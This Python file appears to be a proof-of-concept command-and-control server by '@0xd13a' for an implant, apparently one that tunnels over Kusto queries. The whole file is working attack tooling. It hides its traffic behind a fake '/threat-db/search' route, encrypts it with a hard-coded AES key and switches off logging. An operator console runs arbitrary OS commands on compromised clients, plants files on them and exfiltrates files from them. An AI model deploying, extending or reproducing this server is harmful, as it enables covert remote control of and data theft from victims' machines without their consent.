#!/usr/bin/env python

# Kusto C2 Server PoC (@0xd13a)

# If the Crypto library is not installed run:
#
#   pip3 install pycryptodome

import base64
from flask import Flask, request
import logging
import os
import queue
import threading
import requests
import shlex
import gzip
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
import struct
import time
import sys

server_port = 80                           # Port to listen on (defaults to 80)
SHUTDOWN_COMMAND = '/shutdown089456782'    # Unique shutdown API access point

# Available commands
EXIT_COMMAND = "!exit"
DOWNLOAD_COMMAND = "!download"
EXFIL_COMMAND = "!exfil"
HELP_COMMAND = "!help"

# Pre-shared encryption key
ENCRYPT_KEY = bytearray([0x47, 0xb6, 0x0c, 0x67, 0xcb, 0x1a, 0xd1, 0x57, 0x7a, 0x7b, 0x51, 0x24, 0x75, 0xc2, 0xea, 0x2f, 
                         0x6e, 0xe1, 0x17, 0x3e, 0xaa, 0x60, 0x9e, 0xe8, 0x1a, 0x58, 0x5b, 0x79, 0x73, 0x41, 0x82, 0x46])


# Server command opcodes
RESP_OP_STANDBY  = 0  # No-op
RESP_OP_EXECUTE  = 1  # Execute a command
RESP_OP_DOWNLOAD = 2  # Download file to the client
RESP_OP_EXFIL    = 3  # Exfiltrate file to server

# Client response opcodes
REQ_OP_PING     = 0   # Hertbeat ping
REQ_OP_CONTINUE = 1   # Reserved
REQ_OP_RESEND   = 2   # Reserved
REQ_OP_DATA     = 3   # Data (file contents, command output, etc)
REQ_OP_RESULT   = 4   # Command execution result (1 - success, 0 - failure)

# Max server response chunk size 
RESP_CHUNK_SIZE = 8000

# Parsed client data fields
RESP_TYPE     = 0
RESP_FINISHED = 1
RESP_DATA     = 2

# Queues for accumulating requests from client and responses. Queues are needed to synchronize between HTTP server thread and interactive interface thread.
command_queue = queue.Queue()
response_queue = queue.Queue()

# Accumulated payload constructed from separate pieces
payload = bytearray()

app = Flask(__name__)

def encode(val):
    """Encode data block as series of 16-byte hex values."""
    encoded = ""
    for i in range(len(val) // 16):
        encoded += (''.join('{:02x}'.format(x) for x in val[i*16:i*16+16])).zfill(32) + '\n'
    return encoded

def compose_chunk(type, resp, total, pos, size):
    """Build the response payload chunk, decorated with necessary counters, encrypted, and encoded."""
    data = bytearray([type])
    data.extend(struct.pack('<I',total))
    data.extend(struct.pack('<I',pos))
    data.extend(struct.pack('<I',size))
    data.extend(resp[pos:pos+size])

    encrypted = encrypt(data) 
    encoded = encode(encrypted)

    return encoded

def get_noop_response():
    """Build simple response to a ping."""
    return encode(encrypt(bytearray([RESP_OP_STANDBY])))

def pack_response(type, resp):
    """Split response document into chunks of limited length."""
    resp_size = len(resp)

    resp_array = []

    i = 0
    while i < resp_size:
        if (resp_size - i) > RESP_CHUNK_SIZE:
            chunk_size = RESP_CHUNK_SIZE
        else:
            chunk_size = resp_size - i

        resp_array.append(compose_chunk(type, resp, resp_size, i, chunk_size))

        i += RESP_CHUNK_SIZE

    return resp_array

def unpack_request_part(req):
    """Unpack data from HTTP request."""

    decoded = base64.b64decode(req.replace("-","/")) 

    decrypted = decrypt(decoded)

    type = decrypted[0]

    if len(decrypted) == 1: # Simple 1-byte request
        return (type,True,bytearray())
    elif len(decrypted) == 2: # Simple 2-byte request
        return (type,True,decrypted[1])

    # More complex request with sizes and counters
    total = struct.unpack('<I',decrypted[1:5])[0]
    pos = struct.unpack('<I',decrypted[5:9])[0]
    size = struct.unpack('<I',decrypted[9:13])[0]

    return (type,(pos+size) >= total,decrypted[13:])
    

def start_server():
    """Start C2 HTTP server and disable logging."""
    log = logging.getLogger('werkzeug')
    os.environ['WERKZEUG_RUN_MAIN'] = 'true'
    log.setLevel(logging.ERROR)
    log.disabled = True
    app.logger.disabled = True
    app.run(host='0.0.0.0', port=server_port, debug=False, use_reloader=False)

def show_heartbeat():
    """Show quick heartbeat indicator."""
    print('\u2764\b', end='', flush=True)
    time.sleep(0.5)
    print(' \b', end='', flush=True)

@app.route('/threat-db/search=<data>', methods=['GET','HEAD'])
def handler(data):
    """Main request handler."""
    global payload

    if request.method == 'HEAD':
        return ""
    else:
        unpacked = unpack_request_part(data)

        # Handle simple ping
        if unpacked[RESP_TYPE] == REQ_OP_PING:
            show_heartbeat()

            try:
                cmd = command_queue.get_nowait()
                command_queue.task_done()
            except queue.Empty:
                return get_noop_response()

            return cmd

        # Handle data that was sent from the client
        elif unpacked[RESP_TYPE] == REQ_OP_DATA:
            payload.extend(unpacked[RESP_DATA])
            
            if unpacked[RESP_FINISHED]:
                response_queue.put(decompress(payload))
                payload = bytearray()

        # Handle operation result indicator sent from the client
        elif unpacked[RESP_TYPE] == REQ_OP_RESULT:
            response_queue.put(unpacked[RESP_DATA])

        return get_noop_response()

@app.route(SHUTDOWN_COMMAND)
def shutdown():
    """Shutdown handler."""
    func = request.environ.get('werkzeug.server.shutdown')
    if func is None:
        raise RuntimeError('Not running with the Werkzeug Server')
    func()

def get_answer():
    """Retrieve response from the client."""
    while True:
        try:
            answer = response_queue.get_nowait()
            response_queue.task_done()
            return answer
        except queue.Empty:
            continue

def send_command(op,data):
    """Send command to client."""
    resp_array = pack_response(op, data)

    for chunk in resp_array:
        command_queue.put(chunk)

def download(localName, remoteName):
    """Download file from server onto the client."""
    print("Downloading local file '{}' to remote '{}'".format(localName, remoteName))

    try:
        with open(localName, 'rb') as f:
            file_data = bytearray(f.read())
    except IOError:
        print("Could not read file " + localName)
        return

    resp = bytearray()
    resp.extend(struct.pack('<I',len(remoteName)))
    resp.extend(remoteName.encode())
    compressed = compress(file_data)
    resp.extend(struct.pack('<I',len(compressed)))
    resp.extend(compressed)

    send_command(RESP_OP_DOWNLOAD, resp)
    if get_answer() == 0:
        print("Error downloading the file")

def exfil(remoteName, localName):
    """Send command to client to exfiltrate a file."""
    print("Exfiltrating remote file '{}' to local '{}'".format(remoteName, localName))
    
    resp = bytearray()
    resp.extend(struct.pack('<I',len(remoteName)))
    resp.extend(remoteName.encode())

    send_command(RESP_OP_EXFIL, resp)
    answer = get_answer()

    # If the length of data is 0 there was a problem with exfiltration (e.g. file not found or inaccessible)
    if len(answer) == 0:
        print("Error exfiltrating the file")
    else:
        try:
            with open(localName, "wb") as f:
                f.write(answer)
        except IOError:
            print("Could not write file " + localName)

def execute(cmd):
    """Send a command to the client to be executed."""
    print("Executing command: " + cmd)

    resp = bytearray()
    resp.extend(struct.pack('<I',len(cmd)))
    resp.extend(cmd.encode())

    send_command(RESP_OP_EXECUTE, resp)
    answer = get_answer().decode("utf-8") 
    print(answer)

def compress(data):
    """Compress data."""
    return gzip.compress(data)

def decompress(data):
    """Decompress data."""
    return gzip.decompress(data)

def encrypt(data):
    """Encrypt data."""
    iv = get_random_bytes(AES.block_size)
    cipher = AES.new(ENCRYPT_KEY, AES.MODE_CBC, iv)
    return iv + cipher.encrypt(pad(data, AES.block_size))

def decrypt(data):
    """Decrypt data."""
    cipher = AES.new(ENCRYPT_KEY, AES.MODE_CBC, data[:AES.block_size])
    return unpad(cipher.decrypt(data[AES.block_size:]), AES.block_size)

def help():
    print("""
    Available commands:

    command   - any command you want to execute on the client (e.g. dir)
    !download localFile remoteFileOrFolder - download file from server to client machine
    !exfil    remoteFile localFileOrFolder - exfil file from client to server machine
    !exit     - shut down server
    !help     - this help
    """)

def exit(msg = ""):
    """Shut down server."""
    if len(msg) != 0:
        print(msg)
    requests.get('http://127.0.0.1:' + str(server_port) + SHUTDOWN_COMMAND)

def adjust_path(path):
    """Encode backslashes to make sure they are properly processed."""
    return path.replace('\\','\\\\')

def serve():
    """Main interactive loop."""
    while True:
        try:
            command = input("> ").strip()
        except:
            command = EXIT_COMMAND

        if command == "":
            continue

        # Exit command
        if command == EXIT_COMMAND:
            exit()
        # Help command
        elif command == HELP_COMMAND:
            help()
        # Download of file to client
        elif command.startswith(DOWNLOAD_COMMAND):
            parsed_command = shlex.split(adjust_path(command[len(DOWNLOAD_COMMAND):]).strip())
            if len(parsed_command) != 2:
                print("Command takes 2 arguments")
            download(parsed_command[0], parsed_command[1])
        # Exfile of file from client
        elif command.startswith(EXFIL_COMMAND):
            parsed_command = shlex.split(adjust_path(command[len(EXFIL_COMMAND):]).strip())
            if len(parsed_command) != 2:
                print("Command takes 2 arguments")
            exfil(parsed_command[0], parsed_command[1])
        elif command.startswith("!"):
            print("Unknown command " + command)
        else:
            # Command without bang in front is interpreted as OS command
            execute(command)

def parse_params():
    """Handle command line parameters."""
    global server_port
    usage = "\nUsage:\n  " + sys.argv[0] + " [port]"

    success = True
    # Parse port number, if specified
    if len(sys.argv) != 1:
        if len(sys.argv) > 2:
            success = False
        else:
            try:
                server_port = int(sys.argv[1])
            except:
                success = False
            if server_port < 1 or server_port > 65535:
                success = False

    if not success:
        print(usage)
        quit()

if __name__ == "__main__":
    print("Kusto C2 Server (@0xd13a)  --  Type !help for help")

    parse_params()

    threading.Thread(target=start_server).start()

    serve()